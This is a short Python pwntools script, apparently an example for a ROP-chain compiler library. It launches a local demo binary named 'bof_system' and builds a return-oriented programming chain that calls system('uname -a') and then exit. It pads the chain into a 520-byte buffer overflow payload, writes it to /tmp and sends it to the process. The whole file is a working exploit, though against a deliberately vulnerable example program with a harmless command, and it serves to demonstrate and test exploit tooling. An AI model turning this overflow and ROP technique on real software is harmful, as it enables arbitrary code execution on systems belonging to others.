import sys, logging
from pwn import *
from rop_compiler import ropme, goal

filename = './example/bof_system'
p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40071e\nbreak *system\nbreak *execve\nset follow-fork-mode child\ncatch syscall execve")

print "Using automatically built ROP chain"
files = [(filename, None, 0)]
uname_a_address = 0x400810 # address of the string "uname -a"
exit_address = "0x400570" # the exit symbol's address isn't correct when found by pyelftools, so we need to get it ourselves
goal_resolver = goal.create_from_arguments(files, [], [["function", "system", uname_a_address], ["function", exit_address, 33]])
rop = ropme.rop(files, goal_resolver)

payload = 'A'*512 + 'B'*8 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

print 'Calling system("uname -a") in the target'
p.readline()
p.writeline(payload)
print "\n%s\n" % p.readline()
